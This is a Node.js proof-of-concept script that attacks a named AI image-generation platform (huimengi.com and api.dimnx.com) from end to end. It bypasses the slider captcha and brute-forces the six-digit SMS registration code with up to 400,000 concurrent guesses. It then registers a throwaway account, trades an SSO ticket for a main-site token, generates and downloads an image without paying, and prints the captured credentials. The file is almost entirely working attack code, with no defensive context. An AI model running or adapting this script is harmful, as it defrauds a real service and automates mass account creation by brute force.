// huimengi 零成本出图全链路: 滑块 -> 发码 -> 验证码爆破 -> 注册 -> SSO 换主站 token -> 免费出图 -> 下载
// 用法: node poc_free_gen.mjs [--phone 19900000123] [--max 400000] [--conc 200] [--model z-image-turbo] [--prompt "..."] [--out out.png]
import { writeFileSync } from 'node:fs';
import { captchaVerification, B, UA } from './lib_captcha.mjs';

const argv = process.argv.slice(2);
const arg = (k, d) => { const i = argv.indexOf('--' + k); return i >= 0 ? argv[i + 1] : d; };
const rand = n => Array.from({ length: n }, () => '0123456789abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random() * 36)]).join('');
const phone = arg('phone') || ('1990000' + String(Math.floor(Math.random() * 9000) + 1000));
const MAX = Number(arg('max', 400000));
const CONC = Number(arg('conc', 200));
const MODEL = arg('model', 'z-image-turbo');
const TASKTYPE = arg('tasktype', 'TEXT_TO_IMAGE_Z_IMAGE_TURBO');
const PROMPT = arg('prompt', '中国古代红衣女子，红盖头，中式婚嫁，电影感，超细节');
const OUT = arg('out', 'free_gen.png');
const ENTITY_ID = arg('entity', '910141757437563478');
const ENTITY_TYPE = arg('entitytype', 'character');
const PWD = 'Passw0rd!23';
const TNAME = 't' + rand(9);

const post = async (url, body, headers = {}) => {
  for (let a = 0; a < 3; a++) {
    try {
      const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'User-Agent': UA, Origin: 'https://huimengi.com', ...headers }, body: JSON.stringify(body), signal: AbortSignal.timeout(8000) });
      const t = await r.text();
      try { return { r, j: JSON.parse(t) }; } catch { return { r, j: t }; }
    } catch (e) {
      if (a === 2) return { r: null, j: { code: 'NET', msg: 'net:' + e.message } };
      await new Promise(z => setTimeout(z, 150));
    }
  }
};

// ---- 1. 注册拿号 ----
console.log('[1] 解滑块 + 发验证码 ->', phone);
const cv = await captchaVerification(() => {});
const sms = await post(B + '/api/auth/sms/send', { phone, scene: 'register', captchaVerification: cv });
console.log('    sms:', JSON.stringify(sms.j).slice(0, 160));
if (String(sms.j.code) !== '0') { console.log('    发码失败，退出'); process.exit(1); }

console.log('[2] 爆破 6 位验证码 上限', MAX, '并发', CONC);
let found = null, tried = 0, regResp = null;
const t0 = Date.now();
outer:
while (tried < MAX) {
  const batch = [];
  for (let i = 0; i < CONC && tried + i < MAX; i++) {
    const c = String(Math.floor(Math.random() * 1000000)).padStart(6, '0');
    batch.push(post(B + '/api/auth/register', { phone, password: PWD, code: c, tenantName: TNAME }).then(({ r, j }) => ({ c, j, r })));
  }
  const res = (await Promise.allSettled(batch)).map(x => x.status === 'fulfilled' ? x.value : { c: '', j: { code: 'NET' } });
  tried += res.length;
  for (const it of res) {
    const msg = String(it.j.msg || '');
    if (String(it.j.code) === '0') { found = it.c; regResp = it; break outer; }
    if (msg.includes('团队名称已存在')) { found = it.c; regResp = it; break outer; }
    if (msg.includes('该手机号已注册')) { console.log('    号码已注册'); process.exit(2); }
  }
  if (tried % 20000 < CONC) process.stdout.write('\r    已试 ' + tried + ' / ' + MAX + '  ' + ((Date.now() - t0) / 1000).toFixed(0) + 's');
}
if (!found) { console.log('\n    未命中，退出'); process.exit(3); }
console.log('\n[3] 验证码命中:', found, '用时', ((Date.now() - t0) / 1000).toFixed(1) + 's');
const tenants = regResp.j?.data?.tenants || [];
const tn = tenants[0] || {};
const hmToken = (regResp.r?.headers.getSetCookie?.() || []).map(s => (s.match(/Hm-Token=([^;]+)/) || [])[1]).filter(Boolean)[0];
console.log('    tenantId', tn.tenantId, 'tenantCode', tn.tenantCode, 'role', tn.roleCode, 'Hm-Token', (hmToken || '').slice(0, 8) + '...');

// ---- 2. SSO 换主站 token ----
console.log('[4] getRedirectUrl -> doLoginByTicket');
const gd = await fetch('https://platform.huimengi.com/sso/getRedirectUrl', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, Cookie: 'Hm-Token=' + (hmToken || '') },
  body: new URLSearchParams({ client: 'platform', redirect: 'https://huimengi.com/home', brand: 'huimengi', tenantId: String(tn.tenantId || ''), inviteCode: '' }).toString(),
  signal: AbortSignal.timeout(10000)
});
const gj = await gd.json();
const ticket = (String(gj?.data || '').match(/ticket=([^&]+)/) || [])[1];
if (!ticket) { console.log('    getRedirectUrl 失败:', JSON.stringify(gj).slice(0, 200)); process.exit(4); }
console.log('    ticket', ticket.slice(0, 12) + '...');

const dl = await fetch('https://api.dimnx.com/sso/doLoginByTicket', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA },
  body: new URLSearchParams({ ticket, inviteCode: '' }).toString(),
  signal: AbortSignal.timeout(10000)
});
const dj = await dl.json();
const tk = dj?.data?.token;
if (!tk) { console.log('    换票失败:', JSON.stringify(dj).slice(0, 300)); process.exit(5); }
const H = { Authorization: 'Bearer ' + tk, 'x-tenant-id': String(dj.data.tenantId), 'x-tenant-code': dj.data.tenantCode, 'Content-Type': 'application/json', 'User-Agent': UA };
console.log('    主站 token 已获取 userId', dj.data.userId);

// ---- 3. 签到 + 余额 ----
await fetch('https://api.dimnx.com/api/daily-visit/sign-in', { method: 'POST', headers: H, body: '{}' }).then(r => r.text()).then(t => console.log('    签到:', t.slice(0, 120))).catch(() => {});
const pts = async () => (await (await fetch('https://api.dimnx.com/api/billing/points/overview', { headers: H })).json())?.data?.balance?.totalPoints;
console.log('    积分:', await pts());

// ---- 4. 出图 ----
console.log('[5] 提交出图任务 model=' + MODEL);
const body = { taskType: TASKTYPE, entityType: ENTITY_TYPE, entityId: ENTITY_ID, count: 1, config: { prompt: PROMPT, aspectRatio: '16:9' } };
const sub = await post('https://api.dimnx.com/api/aigc/text-to-image/' + MODEL, body, H);
console.log('    submit:', JSON.stringify(sub.j).slice(0, 200));
const taskId = sub.j?.data?.[0];
if (!taskId) process.exit(6);

// ---- 5. 轮询, 即便 FAILED 也取图 ----
console.log('[6] 轮询任务', taskId);
let img = null, final = null;
for (let i = 0; i < 60; i++) {
  await new Promise(z => setTimeout(z, 5000));
  const q = await (await fetch('https://api.dimnx.com/api/tasks/' + taskId, { headers: H })).json();
  const d = q.data || {};
  const rr = d.output_data?.result_response?.result;
  const u = rr?.image_url || rr?.image_urls?.[0];
  if (u) { img = u; }
  if (d.status === 'FAILED' || d.status === 'COMPLETED') { final = d; break; }
  if (i % 3 === 0) process.stdout.write('\r    ' + (d.status || '?') + ' ' + (i * 5) + 's');
}
console.log('\n    最终状态:', final?.status, '| error:', final?.error_message || 'none');
if (!img) { console.log('    未拿到图片 URL'); process.exit(7); }
console.log('    图片 URL:', img.split('?')[0]);

// ---- 6. 下载 ----
const bin = Buffer.from(await (await fetch(img)).arrayBuffer());
writeFileSync(OUT, bin);
console.log('[7] 已保存', OUT, bin.length, 'bytes');
console.log('    出图后积分:', await pts());
console.log('\n=== 凭据 ===');
console.log('phone     :', phone);
console.log('password  :', PWD);
console.log('tenantName:', TNAME);
console.log('tenantId  :', dj.data.tenantId);
console.log('tenantCode:', dj.data.tenantCode);
console.log('userId    :', dj.data.userId);
console.log('token     :', tk);
